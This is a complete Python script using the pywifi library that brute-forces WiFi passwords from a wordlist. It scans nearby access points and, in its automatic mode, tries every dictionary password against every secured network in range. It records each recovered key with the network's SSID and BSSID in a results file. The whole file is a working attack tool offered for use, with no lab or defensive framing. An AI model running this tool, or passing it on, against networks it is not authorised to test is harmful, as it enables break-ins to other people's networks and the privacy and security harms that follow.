#!/usr/bin/env python
# -*- coding:utf-8 -*-
import sys
import time
import argparse
import os

# 检查依赖库 pywifi 是否已安装
try:
    from pywifi import *
except ImportError:
    print("未找到 pywifi 库，请安装该库：")
    print("使用以下命令安装：")
    print("pip install pywifi")
    sys.exit(1)

def get_wifi_interface():
    wifi = PyWiFi()
    if len(wifi.interfaces()) <= 0:
        print('No wifi interface found!')
        exit()
    if len(wifi.interfaces()) == 1:
        print('Wifi interface found: %s' % (wifi.interfaces()[0].name()))
        return wifi.interfaces()[0]
    else:
        print('%-4s   %s' % ('No', 'interface name'))
        for i, w in enumerate(wifi.interfaces()):
            print('%-4s   %s' % (i, w.name()))
        while True:
            iface_no = input('Please choose interface No:')  # 改为 input()
            no = int(iface_no)
            if no >= 0 and no < len(wifi.interfaces()):
                return wifi.interfaces()[no]

def get_akm_name(akm_value):
    akm_name_value = {'NONE': 0, 'UNKNOWN': 5, 'WPA': 1, 'WPA2': 3, 'WPA2PSK': 4, 'WPAPSK': 2}
    akm_names = []
    for a in akm_value:
        for k, v in akm_name_value.items():
            if v == a:
                akm_names.append(k)
                break
    if len(akm_names) == 0:
        akm_names.append("OPEN")

    return '/'.join(akm_names)

def get_iface_status(status_code):
    status = {'CONNCTED': 4, 'CONNECTING': 3, 'DISCONNETED': 0, 'INACTIVE': 2, 'SCANNING': 1}
    for k, v in status.items():
        if v == status_code:
            return k
    return ''

def scan(face):
    ap_list = {}
    print("-" * 72)
    print("%-4s %-20s  %-20s   %-6s   %s" % ('No', 'SSID', 'BSSID', 'SIGNAL', 'ENC/AUTH'))
    face.scan()
    time.sleep(5)
    for i, x in enumerate(face.scan_results()):
        ssid = x.ssid
        if len(ssid) == 0:  # hidden ssid
            ssid = '<length: 0>'
        elif ssid == '\\x00':  # hidden ssid
            ssid = '<length: 1>'
        else:
            if len(x.akm) > 0:  # if len(x.akm)==0 ,the auth is OPEN
                ap_list[x.bssid] = x
        print("%-4s %-20s| %-20s | %-6s | %s" % (i + 1, ssid, x.bssid, x.signal, get_akm_name(x.akm)))
    
    return face.scan_results(), ap_list

def test(i, face, x, key, stu, ts):
    showID = x.bssid if len(x.ssid) == 0 or x.ssid == '\\x00' or len(x.ssid) > len(x.bssid) else x.ssid
    key_index = 0
    while key_index < len(key):
        k = key[key_index]
        x.key = k.strip()
        face.remove_all_network_profiles()
        face.connect(face.add_network_profile(x))
        code = -1
        t1 = time.time()
        now = time.time() - t1
        # check connecting status
        while True:
            time.sleep(0.1)
            code = face.status()
            now = time.time() - t1
            # timeout: try next
            if now > ts:
                break
            stu.write("\r%-6s| %-18s| %5.2fs | %-6s %-15s | %-12s" % (i, showID, now, len(key) - key_index, k.strip(), get_iface_status(code)))
            stu.flush()
            # disconnect: maybe fail or busy
            if code == const.IFACE_DISCONNECTED:
                break
            # connect: test success
            elif code == const.IFACE_CONNECTED:
                face.disconnect()
                stu.write("\r%-6s| %-18s| %5.2fs | %-6s %-15s | %-12s\n" % (i, showID, now, len(key) - key_index, k.strip(), 'FOUND!'))
                stu.flush()
                return "%-20s | %s | %15s" % (x.ssid, x.bssid, k)
        # if is busy, then retry:
        if code == const.IFACE_DISCONNECTED and now < 1:
            stu.write("\r%-6s| %-18s| %5.2fs | %-6s %-15s | %-12s" % (i, showID, now, len(key) - key_index, k.strip(), 'BUSY!'))
            stu.flush()
            time.sleep(10)
            continue
        # try next key:
        key_index = key_index + 1

    stu.write("\r%-6s| %-18s| %-6s | %-6s %-15s | %-12s\n" % (i, showID, '', '', '', 'FAIL!'))
    stu.flush()
    return False

def auto_test(keys, timeout, result_file):
    output = sys.stdout
    iface = get_wifi_interface()
    # scan for ap list
    ap_list = {}
    SCAN_NUMBER = 5
    for i in range(SCAN_NUMBER):
        scan_results, scan_ap = scan(iface)
        ap_list.update(scan_ap)
    print('%s\nTEST WIFI LIST:' % ('-' * 72))
    print("%-4s %-20s  %-20s   %-6s   %s" % ('No', 'SSID', 'BSSID', 'SIGNAL', 'ENC/AUTH'))
    item_index = 1
    for k, x in ap_list.items():
        print("%-4s %-20s| %-20s | %-6s | %s" % (item_index, x.ssid, x.bssid, x.signal, get_akm_name(x.akm)))
        item_index = item_index + 1
    print('TOTAL TEST WIFI:%s' % len(ap_list))
    # test
    item_index = 1
    print("%s\n%-6s| %-18s|  %-4s  | %-6s %-15s | %-12s\n%s" % ("-" * 72, "WIFINO", "SSID OR BSSID", "TIME", "KEYNUM", "KEY", "STATUS", "=" * 72))
    for k, v in ap_list.items():
        res = test(item_index, iface, v, keys, output, timeout)
        if res:
            with open(result_file, "a", encoding='utf-8') as f:
                f.write(res)
        item_index = item_index + 1

def manual_test(keys, timeout, result_file):
    output = sys.stdout
    iface = get_wifi_interface()
    # choose one wifi to test
    wifi_no = ''
    scanres = None
    while True:
        # scan for ap list
        scanres, ap_list = scan(iface)
        wifi_no = input('Please choose test No:')  # 改为 input()
        if len(wifi_no.strip()) == 0:  # if no choice and press enter, refresh ap list
            continue
        else:
            break
    numbers = wifi_no.strip().split(',')
    print("%s\n%-6s| %-18s|  %-4s  | %-6s %-15s | %-12s\n%s" % ("-" * 72, "WIFINO", "SSID OR BSSID", "TIME", "KEYNUM", "KEY", "STATUS", "=" * 72))
    for no in numbers:
        if int(no) >= 1 and int(no) <= len(scanres):
            res = test(int(no), iface, scanres[int(no) - 1], keys, output, timeout)
            if res:
                with open(result_file, "a", encoding='utf-8') as f:
                    f.write(res)

def main():
    # 选择模式和密码文件
    print("请选择测试模式：")
    print("1. 自动模式 (Auto Mode)")
    print("2. 手动模式 (Manual Mode)")

    mode_choice = input("请输入模式编号（1 或 2）：")
    if mode_choice == "1":
        mode = 'a'
    elif mode_choice == "2":
        mode = 'm'
    else:
        print("无效的模式选择！")
        return

    key_file = input("请输入密码字典文件路径（默认使用 top10.txt）：")
    if not key_file:
        key_file = "top10.txt"

    if not os.path.exists(key_file):
        print("密码字典文件不存在，请检查文件路径！")
        return

    timeout = 15  # 设置超时时间
    result_file = 'result.txt'
    keys = ''
    with open(key_file, "r", encoding='utf-8') as f:
        keys = f.readlines()

    print(f"Total KEYS {len(keys)}")
    if mode == 'a':
        auto_test(keys, timeout, result_file)
    else:
        manual_test(keys, timeout, result_file)

    print('\nDone...')

if __name__ == '__main__':
    main()